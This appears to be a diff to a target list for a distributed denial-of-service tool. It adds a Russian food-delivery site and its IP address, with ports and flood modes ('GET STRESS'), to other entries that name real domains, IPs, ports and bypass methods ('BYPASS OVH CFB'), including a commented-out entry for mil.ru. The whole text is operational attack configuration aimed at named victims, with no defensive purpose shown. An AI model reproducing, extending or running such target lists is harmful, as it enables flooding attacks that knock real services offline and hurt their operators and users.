@@ -84,6 +84,8 @@ https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 ht
 
 https://cargocash.ru http://cargocash.ru 94.228.116.171:80 94.228.116.171:443 https://94.228.116.171:443 tcp://94.228.116.171:22 tcp://94.228.116.171:25 tcp://94.228.116.171:80 tcp://94.228.116.171:143 tcp://94.228.116.171:443 tcp://94.228.116.171:587 tcp://94.228.116.171:3306 --http-methods BYPASS OVH CFB
 
+https://k-porogu.com/delivery/all/rnd https://k-porogu.com/delivery/shashlik/rnd http://82.202.204.131:80 http://82.202.204.131:443 https://82.202.204.131:443 tcp://82.202.204.131:22 tcp://82.202.204.131:80 tcp://82.202.204.131:123 tcp://82.202.204.131:443 --http-methods GET STRESS
+
 #94.228.116.171:80 94.228.116.171:443 https://94.228.116.171:443 tcp://94.228.116.171:443 tcp://94.228.116.171:22 tcp://94.228.116.171:80 tcp://94.228.116.171:143 tcp://94.228.116.171:3306 --http-methods stress get head
 
 #https://mil.ru http://mil.ru 87.242.66.56:80 87.242.66.56:443 https://87.242.66.56:443 tcp://87.242.66.56:443 tcp://87.242.66.56:80  --http-methods bypass get stress
